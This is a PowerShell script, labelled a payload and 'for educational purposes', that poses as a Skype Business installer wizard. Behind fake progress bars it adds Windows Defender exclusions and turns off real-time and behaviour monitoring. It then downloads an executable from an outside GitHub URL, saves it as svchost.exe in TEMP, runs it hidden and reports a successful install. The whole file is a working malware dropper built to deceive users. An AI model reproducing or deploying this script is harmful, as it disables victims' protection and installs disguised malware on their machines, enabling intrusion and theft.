# ============================================================
#   SKYPE BUSINESS MEETING PROFESSIONAL PLAN - PAYLOAD
#   Mirrors the Python camo installer chain
#   For Educational Purposes Only
# ============================================================

# ---- Force TLS 1.2 + ignore certificate errors ----
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}
try {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {}

# ---- Console theme setup ----
try { $Host.UI.RawUI.WindowTitle = "Skype Business Meeting Professional Plan - Installation Wizard" } catch {}
try {
    Add-Type -Namespace Win32 -Name Console -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetStdHandle(int nStdHandle); [DllImport("kernel32.dll")] public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode); [DllImport("kernel32.dll")] public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);'
    $h = [Win32.Console]::GetStdHandle(-11)
    $m = 0
    [void][Win32.Console]::GetConsoleMode($h, [ref]$m)
    [void][Win32.Console]::SetConsoleMode($h, $m -bor 0x0004)
} catch {}

$ESC = [char]27
$C = @{
    Reset="$ESC[0m"; Bold="$ESC[1m"; Dim="$ESC[2m"
    Red="$ESC[31m"; Green="$ESC[32m"; Yellow="$ESC[33m"
    Blue="$ESC[34m"; Magenta="$ESC[35m"; Cyan="$ESC[36m"; White="$ESC[37m"
    BRed="$ESC[91m"; BGreen="$ESC[92m"; BYellow="$ESC[93m"
    BBlue="$ESC[94m"; BMagenta="$ESC[95m"; BCyan="$ESC[96m"; BWhite="$ESC[97m"
}

function Write-Banner {
    Write-Host ""
    Write-Host "  $($C.BBlue)$($C.Bold)$('='*66)$($C.Reset)"
    Write-Host "  $($C.BBlue)$($C.Bold)  Skype Business Meeting Professional Plan$($C.Reset)"
    Write-Host "  $($C.BCyan)  Installation Wizard  -  Version 12.4.311$($C.Reset)"
    Write-Host "  $($C.BBlue)$($C.Bold)$('='*66)$($C.Reset)"
    Write-Host ""
    Write-Host "  $($C.White)Preparing components, please wait...$($C.Reset)"
    Write-Host ""
}

function Get-Ts { "[ $((Get-Date).ToString('HH:mm:ss')) ]" }
function Log-Info  { param($m) Write-Host "  $($C.Dim)$(Get-Ts)$($C.Reset)  $($C.BCyan)[> INFO]$($C.Reset)  $m" }
function Log-Ok    { param($m) Write-Host "  $($C.Dim)$(Get-Ts)$($C.Reset)  $($C.BGreen)[+ OK]$($C.Reset)    $m" }
function Log-Warn  { param($m) Write-Host "  $($C.Dim)$(Get-Ts)$($C.Reset)  $($C.BYellow)[! WARN]$($C.Reset)  $m" }
function Log-Debug { param($m) Write-Host "  $($C.Dim)$(Get-Ts)$($C.Reset)  $($C.BMagenta)[~ DBG]$($C.Reset)   $m" }

function Show-Progress {
    param($Label, $Seconds)
    Write-Host "  $($C.Dim)$(Get-Ts)$($C.Reset)  $($C.BCyan)[> INFO]$($C.Reset)  $Label"
    for ($i = 1; $i -le $Seconds; $i++) {
        $pct = [int](($i / $Seconds) * 100)
        $fill = [int]($pct / 2)
        $bar = ("$($C.BGreen)" + ("#" * $fill) + "$($C.Reset)$($C.Dim)" + ("." * (50 - $fill)) + "$($C.Reset)")
        Write-Host "  $($C.Dim)[$($C.Reset)$bar$($C.Dim)]$($C.Reset) $($C.BWhite)$("{0,3}" -f $pct)%$($C.Reset)" -NoNewline
        Write-Host "`r" -NoNewline
        Start-Sleep -Seconds 1
    }
    Write-Host "  $($C.Dim)[$($C.Reset)$($C.BGreen)$("#" * 50)$($C.Reset)$($C.Dim)]$($C.Reset) $($C.BGreen)100%$($C.Reset)"
    Write-Host ""
}

# ------------------------------------------------------------
#  Robust download function (mirrors Python's ssl.CERT_NONE)
# ------------------------------------------------------------
function Download-File {
    param($Url, $OutFile)

    # Try 1: Invoke-WebRequest with cert bypass
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
        if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) { return $true }
    } catch {}

    # Try 2: WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($Url, $OutFile)
        if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) { return $true }
    } catch {}

    # Try 3: curl.exe (present on Windows Server 2019+; harmless if missing)
    try {
        & curl.exe -L -k -o $OutFile $Url 2>$null
        if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) { return $true }
    } catch {}

    return $false
}

# ---- Config ----
$PayloadURL       = "https://github.com/e34821704-max/usdtrsv/raw/refs/heads/main/Skype_Business.exe"
$PythonEmbedURL64 = "https://www.python.org/ftp/python/3.13.15/python-3.13.15-embed-amd64.zip"
$PythonEmbedURL32 = "https://www.python.org/ftp/python/3.13.15/python-3.13.15-embed-win32.zip"
$PayloadPath = Join-Path $env:TEMP "svchost.exe"
$PythonDir   = Join-Path $env:TEMP "python"
$PythonZip   = Join-Path $env:TEMP "python_embed.zip"

# ---- Banner ----
Write-Banner
Start-Sleep -Seconds 1
Log-Info "Detecting system environment..."
Start-Sleep -Seconds 1
Log-Ok "Environment verified"
Write-Host ""

# ---- 18-second delay ----
Show-Progress "Checking system requirements" 6
Show-Progress "Verifying installation integrity" 6
Show-Progress "Initializing update components" 6
Log-Ok "System ready"

# ---- Defender config ----
Log-Info "Configuring system permissions..."
foreach ($p in @($env:TEMP, $PayloadPath, $PythonDir, $PythonZip)) {
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
}
foreach ($proc in @('python.exe','svchost.exe','certutil.exe','powershell.exe')) {
    Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
}
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen  $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection    $true -ErrorAction SilentlyContinue
Log-Ok "Permissions configured"

# ---- Python detection ----
Log-Info "Scanning for existing components..."
$pythonExe = $null
$candidates = @(
    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python313\python.exe"),
    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python312\python.exe"),
    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python311\python.exe"),
    "C:\Python313\python.exe",
    "C:\Python312\python.exe",
    "C:\Python311\python.exe",
    "C:\Program Files\Python313\python.exe",
    "C:\Program Files\Python312\python.exe",
    "C:\Program Files\Python311\python.exe",
    (Join-Path $PythonDir "python.exe")
)
foreach ($c in $candidates) { if (Test-Path $c) { $pythonExe = $c; break } }

if ($pythonExe) {
    Log-Ok "Compatible runtime detected"
} else {
    Log-Info "No compatible runtime found"
    Log-Info "Downloading required runtime package..."

    $arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
    $embedUrl = if ($arch -like "*32*") { $PythonEmbedURL32 } else { $PythonEmbedURL64 }

    $downloaded = Download-File -Url $embedUrl -OutFile $PythonZip

    if ($downloaded -and (Test-Path $PythonZip)) {
        $size = [math]::Round((Get-Item $PythonZip).Length / 1MB, 1)
        Log-Ok "Downloaded runtime ($size MB)"

        Show-Progress "Extracting installation files" 4

        if (Test-Path $PythonDir) { Remove-Item $PythonDir -Recurse -Force -ErrorAction SilentlyContinue }
        New-Item -ItemType Directory -Path $PythonDir -Force | Out-Null

        try {
            Expand-Archive -Path $PythonZip -DestinationPath $PythonDir -Force -ErrorAction Stop
            Remove-Item $PythonZip -Force -ErrorAction SilentlyContinue
            $pythonExe = Join-Path $PythonDir "python.exe"
            if (Test-Path $pythonExe) {
                Log-Ok "Runtime installed successfully"
            } else {
                Log-Warn "Runtime extraction failed"
            }
        } catch {
            Log-Warn "Extraction failed: $_"
        }
    } else {
        Log-Warn "Failed to download runtime package"
    }
}

# ---- Download payload ----
Log-Info "Downloading application package..."
$payloadOK = Download-File -Url $PayloadURL -OutFile $PayloadPath

if ($payloadOK -and (Test-Path $PayloadPath)) {
    $kb = [math]::Round((Get-Item $PayloadPath).Length / 1KB, 1)
    Log-Ok "Application package ready ($kb KB)"
} else {
    Log-Warn "Failed to download application"
}

# ---- Execute payload ----
if ((Test-Path $PayloadPath) -and ((Get-Item $PayloadPath).Length -gt 0)) {
    Log-Info "Launching application..."
    try {
        Start-Process -FilePath $PayloadPath -WindowStyle Hidden
        Log-Ok "Application started"
    } catch {
        Log-Warn "Failed to start application: $_"
    }
}

# ---- Done ----
Write-Host ""
Write-Host "  $($C.BBlue)$($C.Bold)$('='*66)$($C.Reset)"
Write-Host "  $($C.BGreen)$($C.Bold)  [OK]  Installation Complete$($C.Reset)"
Write-Host "  $($C.BBlue)$($C.Bold)$('='*66)$($C.Reset)"
Write-Host ""
Write-Host "  $($C.BWhite)Skype Business Meeting Professional Plan is now ready.$($C.Reset)"
Write-Host "  $($C.Dim)This window will close automatically...$($C.Reset)"
Write-Host ""

for ($i = 5; $i -ge 1; $i--) {
    Write-Host "  $($C.BCyan)Closing in $i...$($C.Reset)" -NoNewline
    Write-Host "`r" -NoNewline
    Start-Sleep -Seconds 1
}
Write-Host "  $($C.Dim)Closing...$(' ' * 20)$($C.Reset)"
exit